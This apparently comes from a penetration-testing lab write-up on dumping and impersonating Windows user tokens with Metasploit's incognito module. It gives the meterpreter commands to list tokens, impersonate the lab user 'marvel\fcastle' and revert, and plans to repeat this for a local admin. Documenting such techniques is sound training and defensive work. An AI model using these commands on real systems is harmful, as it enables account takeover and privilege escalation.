## **Dumping Tokens Using Metasploit**

First of all make sure you have a `meterpreter` shell on our target system

```powershell
meterpreter > load incognito
meterpreter > list_tokens -u
# impersonate_token domain\\user
meterpreter > impersonate_token marvel\\fcastle
```


#### **Example**


![b5tFh1b.png](https://i.imgur.com/b5tFh1b.png)
![](https://i.imgur.com/b5tFh1b.png)


#### **Revert Msfconsole Shell**

This will revert the `meterpreter` session to its original state

```powershell
meterpreter > revself
```


**Since we are able to dump user fcastle token and impersonate it, let do the same for the local admin, first of all switch user from fcastle to the local admin.**



![](https://i.imgur.com/lPsa2e1.png)

```powershell

```

